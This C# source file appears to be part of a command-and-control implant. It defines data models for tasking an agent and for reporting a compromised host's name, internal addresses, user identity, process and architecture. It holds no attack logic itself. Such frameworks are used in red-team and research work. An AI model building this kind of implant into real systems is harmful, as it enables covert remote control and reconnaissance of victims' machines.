using System;
using System.Net;

namespace Agent.Models
{
    public class C2Data
    {
        public delegate bool DataReady();

        public string AgentId { get; set; }
        public string Module { get; set; }
        public string Command { get; set; }
        public string Data { get; set; }
    }

    [Serializable]
    internal class InitialMetadata
    {
        internal string AgentId { get; set; }
        internal string ComputerName { get; set; }
        internal string[] InternalAddresses { get; set; }
        internal string Identity { get; set; }
        internal string ProcessName { get; set; }
        internal int ProcessId { get; set; }
        public string Architecture { get; set; }
    }
}